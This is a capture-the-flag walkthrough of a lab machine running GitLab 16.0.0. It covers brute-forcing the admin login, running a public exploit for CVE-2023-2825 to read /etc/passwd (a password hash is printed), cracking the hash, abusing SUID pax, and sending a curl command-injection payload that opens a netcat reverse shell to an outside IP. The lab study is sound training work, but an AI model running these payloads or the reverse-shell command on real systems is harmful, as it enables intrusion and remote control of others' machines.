# Gitlab

## High Level Overview

GitLab is a high-level Linux machine with several vulnerabilities that, when combined, grant us root access to the system. Upon checking the robots.txt file in the website, We find a list of password credentials in which these can be used to brute force the login page as a root user. From there, we discover a vulnerable GitLab Version 16.0.0 to Arbitrary File Read. After that we can view the /etc/passwd file in which it contains the hash of the plumber user. After brute forcing this hash via using `john` tool, we find the password and connect to this host via SSH. We make use of misconfigured pax to read the app.file in the root folder. Then we generate a specific CURL request to obtain an elevated shell.

# Recon

NMAP finds 2 open TCP port, SSH and HTTPS.

![https://i.ibb.co/jHLqK8r/Nmap.png](https://i.ibb.co/jHLqK8r/Nmap.png)

## Site

It appears that the website is utilizing Gitlab Enterprise Edition.

![https://i.ibb.co/tMFYjKF/Sign-in-Page.png](https://i.ibb.co/tMFYjKF/Sign-in-Page.png)

Let’s enumerate the hidden files and folders with `Gobuster`.

![https://i.ibb.co/YDwSLGb/Gobuster.png](https://i.ibb.co/YDwSLGb/Gobuster.png)

It seems there is a robots.txt file available in the website and probably contains password credential to log in.

![https://i.ibb.co/p39qHzw/Robots-txt.png](https://i.ibb.co/p39qHzw/Robots-txt.png)

The default user for GitLab Enterprise Edition is root.

Let’s use BurpSuite to brute force the user.

![https://i.ibb.co/QHRx7Fg/Root-Password.png](https://i.ibb.co/QHRx7Fg/Root-Password.png)

We found the credentials for the root user in GitLab.

When enumerating the GitLab Version that is available in the help menu.

![https://i.ibb.co/0Jkm4Gn/Gitlab-Version.png](https://i.ibb.co/0Jkm4Gn/Gitlab-Version.png)

GitLab 16.0.0 is vulnerable to Path Traversal and the associated CVE is CVE-2023-2825.

The POC can be found here:

[https://github.com/Occamsec/CVE-2023-2825/blob/main/poc.py](https://github.com/Occamsec/CVE-2023-2825/blob/main/poc.py)

Let’s change username, password and  the endpoint inside this script before executing this script.

```jsx
ENDPOINT = "https://gitlab.icsd"
USERNAME = "root"
PASSWORD = "Shadow123123"
```

The result of the python script:

```jsx
─# python3 poc.py   
[*] Attempting to login...
[*] Login successful as user 'root'
[*] Creating 11 groups with prefix 469
[*] Created group '469-1'
[*] Created group '469-2'
[*] Created group '469-3'
[*] Created group '469-4'
[*] Created group '469-5'
[*] Created group '469-6'
[*] Created group '469-7'
[*] Created group '469-8'
[*] Created group '469-9'
[*] Created group '469-10'
[*] Created group '469-11'
[*] Created public repo '/469-1/469-2/469-3/469-4/469-5/469-6/469-7/469-8/469-9/469-10/469-11/CVE-2023-2825'
[*] Uploaded file '/uploads/2a9cdef69c9b1db6ce7fc909a96cb11f/file'
[*] Executing exploit, fetching file '/etc/passwd': GET - //469-1/469-2/469-3/469-4/469-5/469-6/469-7/469-8/469-9/469-10/469-11/CVE-2023-2825/uploads/2a9cdef69c9b1db6ce7fc909a96cb11f//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
plumber:$y$j9T$Q60srmF7j7UmqQhxTU2/p.$x2mfeh7AqyZr2sAcIT9LTXTEhVIbJ3Oians4wDJdin/:1000:1000:plumber:/home/plumber:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
gitlab-www:x:998:999::/var/opt/gitlab/nginx:/bin/false
git:x:997:998::/var/opt/gitlab:/bin/sh
gitlab-redis:x:996:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:995:996::/var/opt/gitlab/postgresql:/bin/sh
registry:x:994:995::/var/opt/gitlab/registry:/bin/sh
```

It seems the hash of the plumber user is available in the `/etc/passwd` file. Let’s brute force this with the following `john` command.

```jsx
john --format=crypt hash.txt
```

![https://i.ibb.co/18jP5w1/password-found.png](https://i.ibb.co/18jP5w1/password-found.png)

Using this credentials, we can SSH into the “plumber” user.

![https://i.ibb.co/5Fzy4D5/SSH-TO-PLUMBER.png](https://i.ibb.co/5Fzy4D5/SSH-TO-PLUMBER.png)

Let’s look at the Listening Ports via using the following command.

```jsx
netstat -tulnp
```

![https://i.ibb.co/y403JCB/netstat-tools.png](https://i.ibb.co/y403JCB/netstat-tools.png)

Let’s send a CURL request.

```jsx
plumber@plumber:~$ curl 127.0.0.1:10080
Cannot resolve GET request
plumber@plumber:~$
```

Let’s change the HTTP Method (POST) for this.

```jsx
plumber@plumber:~$ curl -XPOST 127.0.0.1:10080
<!doctype html>
<html lang=en>
  <head>
    <title>TypeError: expected str, bytes or os.PathLike object, not NoneType
.....
SHORTENED
.....
<div class="plain">
    <p>
      This is the Copy/Paste friendly version of the traceback.
    </p>
    <textarea cols="50" rows="10" name="code" readonly>Traceback (most recent call last):
  File &#34;/usr/local/lib/python3.10/dist-packages/flask/app.py&#34;, line 2213, in __call__
    return self.wsgi_app(environ, start_response)
  File &#34;/usr/local/lib/python3.10/dist-packages/flask/app.py&#34;, line 2193, in wsgi_app
    response = self.handle_exception(e)
  File &#34;/usr/local/lib/python3.10/dist-packages/flask/app.py&#34;, line 2190, in wsgi_app
    response = self.full_dispatch_request()
  File &#34;/usr/local/lib/python3.10/dist-packages/flask/app.py&#34;, line 1486, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File &#34;/usr/local/lib/python3.10/dist-packages/flask/app.py&#34;, line 1484, in full_dispatch_request
    rv = self.dispatch_request()
  File &#34;/usr/local/lib/python3.10/dist-packages/flask/app.py&#34;, line 1469, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
  File &#34;/root/webapp/app.py&#34;, line 13, in index
    print(&#34;User Input:&#34;, os.system(user_input))
TypeError: expected str, bytes or os.PathLike object, not NoneType
</textarea>
</div>
<div class="explanation">
  The debugger caught an exception in your WSGI application.  You can now
  look at the traceback which led to the error.  <span class="nojavascript">
  If you enable JavaScript you can also use additional features such as code
  execution (if the evalex feature is enabled), automatic pasting of the
  exceptions and much more.</span>
</div>
      <div class="footer">
        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
        friendly Werkzeug powered traceback interpreter.
      </div>
    </div>

    <div class="pin-prompt">
      <div class="inner">
        <h3>Console Locked</h3>
        <p>
          The console is locked and needs to be unlocked by entering the PIN.
          You can find the PIN printed out on the standard output of your
          shell that runs the server.
        <form>
          <p>PIN:
            <input type=text name=pin size=14>
            <input type=submit name=btn value="Confirm Pin">
        </form>
      </div>
    </div>
  </body>
</html>

<!--

Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 2213, in __call__
    return self.wsgi_app(environ, start_response)
  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 2193, in wsgi_app
    response = self.handle_exception(e)
  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 2190, in wsgi_app
    response = self.full_dispatch_request()
  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1486, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1484, in full_dispatch_request
    rv = self.dispatch_request()
  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1469, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
  File "/root/webapp/app.py", line 13, in index
    print("User Input:", os.system(user_input))
TypeError: expected str, bytes or os.PathLike object, not NoneType

-->
plumber@plumber:~$
```

There is a file in ‘/root/webapp/app.py’ which is hosting this simple HTTP service. However, we cannot have access to /root folder.

Enumeration is the key.

When searching for the SUID files, we found that `pax` command has SUID permission and we can abuse this to read the content of the file.

```jsx
LFILE=file_to_read
pax -w "$LFILE"
```

We can view the content of this file through changing the above command.

```jsx
plumber@plumber:~$ LFILE="/root/webapp/app.py"
pax -w "$LFILE"
/root/webapp/app.py010064400000000000000000000011111450271307700132670ustar00rootrootfrom flask import Flask, request, render_template
import os

app = Flask(__name__)

# Define the route for the home page
@app.route('/', methods=['GET','POST'])
def index():
    if request.method == 'POST':
        # Get the user input from the form
        user_input = request.form.get('user_input')
        # Print the user input to the console
        print("User Input:", os.system(user_input))
    elif request.method == 'GET':
        return "Cannot resolve GET request"

#    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True, port=10080)
plumber@plumber:~$
```

The following command can be used to get a reverse shell.

```jsx
plumber@plumber:~$ curl -XPOST localhost:10080 -d "user_input=busybox nc 192.168.47.128 12342 -e sh"
```

![https://i.ibb.co/nMqKpjx/last.png](https://i.ibb.co/nMqKpjx/last.png)

Thank you for Reading!!